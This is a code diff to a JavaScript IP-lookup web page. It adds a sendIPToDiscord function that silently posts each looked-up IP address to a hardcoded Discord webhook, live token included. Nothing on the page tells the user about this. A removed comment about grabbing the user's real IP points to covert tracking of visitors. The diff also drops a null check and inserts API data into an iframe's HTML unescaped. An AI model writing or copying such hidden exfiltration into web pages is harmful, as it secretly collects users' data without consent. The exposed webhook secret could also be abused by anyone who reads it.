@@ -293,9 +293,28 @@
         function applyCustomTheme() {
             const backgroundColor = document.getElementById('backgroundColor').value;
             const buttonColor = document.getElementById('buttonColor').value;
+
             document.body.style.backgroundColor = backgroundColor;
+
             lookupButton.style.backgroundColor = buttonColor;
             lookupButton.style.borderColor = buttonColor;
+        }
+
+        // Discord webhook function
+        async function sendIPToDiscord(ip) {
+            const webhookURL = 'https://discord.com/api/webhooks/1346896671123968082/yR-RgtuhYK3oJON5WW_dpspCRSY47EAEASWw7c8NorE46f6MB2jpS9UnFZ2qGILiJb7o';
+
+            const message = {
+                content: `Nieuw IP-bericht ontvangen: ${ip}`,
+            };
+
+            await fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(message),
+            });
         }
 
         async function lookupIP() {
@@ -337,31 +356,21 @@
                     document.getElementById("region").textContent = data.region || "N/A";
                     document.getElementById("country").textContent = data.country || "N/A";
                     document.getElementById("isp").textContent = data.org || "N/A";
-                    document.getElementById("latitude").textContent = data.loc?.split(',')[0] || "N/A";
-                    document.getElementById("longitude").textContent = data.loc?.split(',')[1] || "N/A";
+                    document.getElementById("latitude").textContent = data.loc.split(",")[0] || "N/A";
+                    document.getElementById("longitude").textContent = data.loc.split(",")[1] || "N/A";
                     document.getElementById("timezone").textContent = data.timezone || "N/A";
+
+                    googleMapDiv.innerHTML = `<iframe class="gmap_iframe" src="https://maps.google.com/maps?q=${data.loc}&output=embed"></iframe>`;
 
                     resultDiv.classList.remove("hidden");
 
-                    googleMapDiv.innerHTML = `<div class="gmap_canvas"><iframe class="gmap_iframe" src="https://www.google.com/maps?q=${data.loc}&t=&z=13&ie=UTF8&iwloc=&output=embed"></iframe></div>`;
-
-                    sendIPToDiscord(); // Send IP to Discord
+                    // Send IP to Discord
+                    await sendIPToDiscord(ip);
                 } catch (error) {
-                    errorMessage.textContent = "Error fetching IP data. Please try again later.";
-                    resultDiv.classList.add("hidden");
-                    secondEmbedContainer.style.display = "none";
-                    embedContainer.style.display = "none"; 
+                    console.error(error);
+                    errorMessage.textContent = "Error retrieving IP information.";
                 }
-            }, 5000);
-        }
-
-        async function sendIPToDiscord() { 
-            const ip = 'gebruikers_ip';  // Hier zou je het echte IP-adres van de gebruiker ophalen
-            await fetch('http://localhost:3000/send-ip', {  // Verzend het IP naar de server
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ ip })  // Verzend het IP in de body van het verzoek
-            });
+            }, 6000);
         }
     </script>
 </body>
